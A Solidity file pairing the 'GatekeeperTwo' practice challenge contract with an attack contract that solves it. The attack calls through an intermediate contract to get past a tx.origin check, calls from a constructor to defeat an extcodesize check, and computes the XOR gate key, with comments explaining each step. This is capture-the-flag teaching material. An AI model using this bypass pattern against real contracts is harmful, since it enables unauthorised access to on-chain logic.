// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        uint256 x;
        assembly {
            x := extcodesize(caller())
        }
        require(x == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

contract GatekeeperTwoAttack {
    constructor(address _gatekeeperAddress) {
        // Gate 1: Pass by calling from another contract (msg.sender != tx.origin)
        
        // Gate 2: Pass by calling from constructor where extcodesize(address(this)) == 0
        // This is because during construction, the contract's code isn't deployed yet
        
        // Gate 3: Solve the XOR equation
        // uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max
        // Therefore: _gateKey = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max
        
        bytes8 gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
        
        GatekeeperTwo(_gatekeeperAddress).enter(gateKey);
    }
}